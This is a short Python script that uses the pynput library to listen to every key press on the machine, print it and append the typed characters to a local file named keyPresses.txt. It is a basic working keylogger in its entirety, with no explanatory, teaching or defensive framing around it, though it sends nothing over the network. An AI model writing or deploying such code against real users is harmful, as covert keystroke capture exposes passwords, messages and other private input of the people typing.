
from pynput import keyboard

def keyboardPress(key):
    print(str(key))
    with open("keyPresses.txt", 'a') as logkey:  
        try:
            char = key.char
            logkey.write(char)  
        except:
            print("Error getting char")

if __name__ == "__main__":
    listener = keyboard.Listener(on_press=keyboardPress)
    listener.start()
    input()